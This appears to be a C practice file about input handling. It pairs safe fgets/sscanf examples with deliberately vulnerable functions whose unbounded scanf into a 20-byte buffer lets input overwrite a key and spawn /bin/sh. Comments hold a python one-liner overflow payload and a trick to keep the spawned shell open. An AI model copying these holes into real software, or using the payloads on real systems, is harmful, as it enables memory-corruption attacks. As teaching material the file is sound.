#include <stdlib.h>
#include <stdio.h>
#include <string.h> // For sscanf


void clear_input_buffer() {
    int c;
    // Read and discard characters until newline or EOF
    while ((c = getchar()) != '\n' && c != EOF);
}

void safe_input(){
 
    char buffer[10]; // Small buffer size for demonstration
    char name[10];
    int age;

    printf("Enter your name and age: ");

    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
        // 1. Check if the input was truncated (no newline found)
        if (strchr(buffer, '\n') == NULL) {
            printf("Input was too long and truncated. Clearing remaining input...\n");
            clear_input_buffer();
        } else {
            // Optional: remove the trailing newline from the buffer
            buffer[strcspn(buffer, "\n")] = '\0';
        }

        // 2. Use sscanf to parse the safely managed buffer
        if (sscanf(buffer, "%9s %d", name, &age) == 2) {
            printf("Name: %s, Age: %d\n", name, age);
        } else {
            printf("Invalid input format.\n");
        }
    } else {
        printf("Error reading input.\n");
        // Handle EOF or read error if necessary
    }

}

void memory_allocation(){
    const int bytes_len = 11;
    char ch = 'a';
    char bytes[bytes_len];
    bytes[bytes_len -1] = '\0';
    char * str2 = "abc";

    for(int i=0; i < bytes_len - 1; i++){
        bytes[i] = 'a' + i;
    }

    printf("%c,%s,%s\n", ch,bytes,str2);

    const int str3_len = 5;
    char * str3 = malloc(str3_len*sizeof(char));
    for(int i=0; i<str3_len-1; i++)
    {
        *(str3 + i) = 'a' + i;
    }
    *(str3 + str3_len-1) = '\0';

    printf("str3: %s\n", str3);  
    

    const int int_arr_len = 5;
    int * int_arr = calloc(int_arr_len, sizeof(int));
    for(int i=0; i<int_arr_len; i++){
        int_arr[i] = i;
    }
    for(int i=0; i<int_arr_len; i++){
        printf("%d", int_arr[i]);
    }
    printf("\n");
}

void fgets_use(){
    char name[100];
    fgets(name,100,stdin);
    printf("name:%s\n",name);
}

void scanf_use(){
    int num=0;
    scanf("%d", &num);
    printf("num:%d\n", num);

    int c;
    while ((c = getchar()) != '\n' && c != EOF) {
        // discard until end of line
    }
}


/* payload: aaaaaaaaaaaaaaaaaaaadbca */
void get_input(){
    char key[] = "abcd";
    char name[20];
    printf("enter name:");
    scanf("%s", &name);
    printf("name:%s\n", name);

    int c;
    while ((c = getchar()) != '\n' && c != EOF) {
        // discard until end of line
    }

    if (strncmp(key,"dbca",4) == 0)
    {
        printf("success\n");
    }
    else
    {
        printf("fail\n");
    }
}
/* 
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + b"\x78\x56\x34\x12" + b"\x0A")' > payload
./prog < payload                                    
enter name:name:AAAAAAAAAAAAAAAAAAAAAAAAxV4
key:305419896
success 

for the shell to be opened for more input:
(cat payload; cat) | ./prog
*/
void get_input2(){
    int key=0x12121212;
    char name[20];
    printf("enter name:\n");
    scanf("%s", &name);
    printf("name:%s\n", name);

    int c;
    while ((c = getchar()) != '\n' && c != EOF) {
        // discard until end of line
    }

    printf("key:%d\n", key);
    if (key == 0x12345678)
    {
        printf("success!\n");
        system("/bin/sh");
    }
    else
    {
        printf("fail\n");
    }
}

int main (int argc, char * argv[])
{
    get_input2();
    exit(0);
}